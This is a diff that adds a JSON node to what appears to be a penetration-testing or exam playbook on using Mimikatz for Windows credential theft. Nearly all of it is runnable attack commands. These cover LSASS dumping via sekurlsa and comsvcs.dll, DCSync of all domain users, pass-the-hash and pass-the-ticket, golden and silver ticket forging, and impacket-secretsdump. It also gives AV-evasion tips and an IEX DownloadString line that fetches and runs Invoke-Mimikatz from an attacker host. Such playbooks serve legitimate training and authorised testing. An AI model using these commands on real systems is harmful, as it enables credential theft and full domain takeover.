@@ -1,0 +1,46 @@
+{
+  "id": "mimikatz",
+  "phase": "CREDS",
+  "title": "Mimikatz — Credential Extraction Toolkit",
+  "body": "Mimikatz is the Swiss Army knife for Windows credentials. It reads LSASS memory, the SAM, the LSA secrets, the DPAPI vault, and Kerberos tickets — then either dumps them or weaponizes them (forge tickets, pass-the-hash, etc.). Anything involving a Windows credential probably has a Mimikatz module.\n\nIt requires local Administrator on the target (most operations need SeDebugPrivilege to read other processes' memory). For DCSync specifically, you don't need to be on the DC — you need replication rights on the *domain*, which usually means Domain Admin or equivalent.\n\nBecause it's the most-detected hacking tool in existence, running mimikatz.exe straight from disk on any modern AV-protected box will fail. In a lab/exam context where AV may be lenient or off, you can drop the binary directly. In a real engagement, you reach for in-memory loaders, LSASS dumping with built-in tools (Task Manager, comsvcs.dll), or a renamed/obfuscated build.\n\n— PICK YOUR APPROACH BY SCENARIO —\n\n  Lab box, no AV:           drop mimikatz.exe, run it directly\n  Lab box with AV:          dump LSASS with comsvcs.dll, parse with pypykatz on Kali\n  Need stealth in-memory:   Invoke-Mimikatz from PowerShell (also widely signatured)\n  Linux only / no Windows:  impacket-secretsdump for DCSync, pypykatz for LSASS minidumps\n\n— THE FOUR MODULES YOU'LL ACTUALLY USE —\n\n  privilege::debug          Enable SeDebugPrivilege (always run first)\n  sekurlsa::*               Read LSASS — logged-on users' hashes and tickets\n  lsadump::*                Read SAM, LSA secrets, perform DCSync\n  kerberos::*               Forge and manipulate tickets (silver/golden)\n\nEverything else (crypto::, ts::, misc::) is situational.",
+  "cmd": "# ══════════════════════════════════════════════════\n# ALWAYS START HERE\n# ══════════════════════════════════════════════════\n# Run from an elevated (Admin) PowerShell or cmd prompt\n.\\mimikatz.exe\n\nmimikatz # privilege::debug\nPrivilege '20' OK                              # if not OK: you're not Admin\n\n# Optional — log everything to a file:\nmimikatz # log mimikatz_run.txt\n\n# ══════════════════════════════════════════════════\n# SEKURLSA — DUMP LIVE CREDENTIALS FROM LSASS\n# ══════════════════════════════════════════════════\n\n# The big one — every logged-on user's hashes, tickets, and (if WDigest is on) plaintext:\nmimikatz # sekurlsa::logonpasswords\n\n# Just the Kerberos tickets in memory:\nmimikatz # sekurlsa::tickets\nmimikatz # sekurlsa::tickets /export             # dump each ticket as a .kirbi file\n\n# Just NTLM hashes (terser output):\nmimikatz # sekurlsa::msv\n\n# AES keys (modern domains may reject RC4 — pull AES256 from same memory region):\nmimikatz # sekurlsa::ekeys\n\n# Escalate Admin → SYSTEM without psexec:\nmimikatz # token::elevate\n\n# Pass-the-Hash — spawn a process as another user using their NTLM hash:\nmimikatz # sekurlsa::pth /user:Administrator /domain:corp.com /ntlm:HASH /run:powershell.exe\n\n# Overpass-the-Hash — convert NTLM to Kerberos TGT (see mimikatz_advanced):\nmimikatz # sekurlsa::pth /user:Administrator /domain:corp.com /aes256:KEY /run:powershell.exe\n\n# Pass-the-Ticket — load a previously exported .kirbi:\nmimikatz # kerberos::ptt c:\\tickets\\Administrator.kirbi\n\n# ══════════════════════════════════════════════════\n# LSADUMP — SAM, LSA SECRETS, DCSYNC\n# ══════════════════════════════════════════════════\n\n# Local SAM (local accounts on the box):\nmimikatz # lsadump::sam\n\n# LSA secrets (cached domain logons, service account passwords):\nmimikatz # lsadump::secrets\n\n# Cached domain credentials (MSCASH/MSCACHEv2 — cracked offline):\nmimikatz # lsadump::cache\n\n# DCSync — pull a single user's hash from the DC via replication:\nmimikatz # lsadump::dcsync /domain:corp.com /user:Administrator\nmimikatz # lsadump::dcsync /domain:corp.com /user:krbtgt              # for golden tickets\n\n# Dump every user in the domain:\nmimikatz # lsadump::dcsync /domain:corp.com /all /csv\n\n# ══════════════════════════════════════════════════\n# KERBEROS — FORGE TICKETS (see silver_tickets node)\n# ══════════════════════════════════════════════════\n\n# Silver ticket (for one SPN, needs that SPN's hash):\nmimikatz # kerberos::golden /sid:DOMAIN-SID /domain:corp.com \\\n    /target:web04.corp.com /service:cifs /rc4:SPN_HASH \\\n    /user:fakeadmin /ptt\n\n# Golden ticket (any user, any service — needs krbtgt hash from DCSync):\nmimikatz # kerberos::golden /sid:DOMAIN-SID /domain:corp.com \\\n    /krbtgt:KRBTGT_HASH /user:fakeadmin /ptt\n\n# List currently cached tickets:\nmimikatz # kerberos::list\n\n# Purge tickets (clean up after PTT):\nmimikatz # kerberos::purge\n\n# ══════════════════════════════════════════════════\n# RUNNING WITHOUT TOUCHING DISK\n# ══════════════════════════════════════════════════\n\n# Method 1 — LSASS dump with built-in tools, parse on Kali\n# On target (Admin cmd or PowerShell):\nrundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump <LSASS_PID> C:\\Windows\\Temp\\lsass.dmp full\n# Get the PID:\ntasklist /svc | findstr lsass\n# Or:\nGet-Process lsass | select id\n\n# Exfil lsass.dmp to Kali, then:\npypykatz lsa minidump lsass.dmp\n# Output is fully Mimikatz-equivalent: hashes, tickets, plaintext if WDigest was on\n\n# Method 2 — Task Manager dump (GUI, no command-line audit trail)\n# Open Task Manager as Admin → Details → right-click lsass.exe → Create dump file\n\n# Method 3 — Invoke-Mimikatz (PowerSploit, widely flagged but works on lab boxes)\nIEX (New-Object Net.WebClient).DownloadString('http://$lhost/Invoke-Mimikatz.ps1')\nInvoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'\n\n# ══════════════════════════════════════════════════\n# FROM KALI WITHOUT MIMIKATZ AT ALL\n# ══════════════════════════════════════════════════\n\n# DCSync (needs DA-equivalent creds):\nimpacket-secretsdump corp.com/jeffadmin:'Pass'@$dc_ip\nimpacket-secretsdump -just-dc-user Administrator corp.com/jeffadmin:'Pass'@$dc_ip\nimpacket-secretsdump -hashes :NTHASH corp.com/jeffadmin@$dc_ip          # PTH version\n\n# Local SAM dump from a remote host (needs local admin):\nimpacket-secretsdump corp.com/admin:'Pass'@$ip                          # also pulls LSA + cached\n\n# Parse a dumped LSASS minidump:\npypykatz lsa minidump lsass.dmp\n\n# Forge tickets without Mimikatz:\nimpacket-ticketer -nthash HASH -domain-sid SID -domain corp.com -spn SPN username\n\n# ══════════════════════════════════════════════════\n# COMMON FAILURE MODES\n# ══════════════════════════════════════════════════\n\n# 'Privilege '20' KO':\n#   Not running as Admin. UAC may also be blocking — re-launch with 'Run as Administrator'.\n#\n# Empty sekurlsa::logonpasswords output:\n#   LSA Protection is enabled (RunAsPPL). Mimikatz can bypass it with !mimidrv,\n#   but you need a driver load — usually easier to dump LSASS and parse offline.\n#\n# Plaintext password is '(null)' for everyone:\n#   WDigest is disabled (default on Windows 8.1+ / 2012 R2+).\n#   You'll get NTLM hashes, just not cleartext. Crack the hashes or use PTH.\n#\n# DCSync 'RPC server unavailable':\n#   Wrong hostname/IP for DC, or you don't have replication rights.\n#   Verify with: Get-ADUser jeffadmin -Properties memberof | select -expand memberof\n#\n# AV killed mimikatz.exe on disk:\n#   Switch to comsvcs.dll method above, or rename the binary and try again.\n#   For exam purposes, a rename + UPX pack often suffices on lab AV.",
+  "warn": "Mimikatz writes to LSASS and reads protected memory. Stable, but a buggy module on a real production DC can cause LSASS to crash → host reboot. On engagements, prefer offline parsing (dump → pypykatz) over live module execution. On exam labs, just go.",
+  "choices": [
+    {
+      "label": "Got NTLM hash — pass-the-hash to lateral move",
+      "next": "pth"
+    },
+    {
+      "label": "Advanced: OPTH, WDigest plaintext, on-DC dump, Invoke-Mimikatz",
+      "next": "mimikatz_advanced"
+    },
+    {
+      "label": "Got DA-equivalent — DCSync the domain",
+      "next": "dcsync"
+    },
+    {
+      "label": "Got SPN hash — forge silver tickets",
+      "next": "silver_tickets"
+    },
+    {
+      "label": "Got plaintext password — spray everywhere",
+      "next": "creds_found"
+    },
+    {
+      "label": "Got DPAPI master key — decrypt user vault",
+      "next": "dpapi"
+    },
+    {
+      "label": "Need foundational AD auth context",
+      "next": "ad_auth_primer"
+    },
+    {
+      "label": "Back to AD menu",
+      "next": "jump_ad"
+    },
+    {
+      "label": "Back to jump menu",
+      "next": "jump_menu"
+    }
+  ]
+}
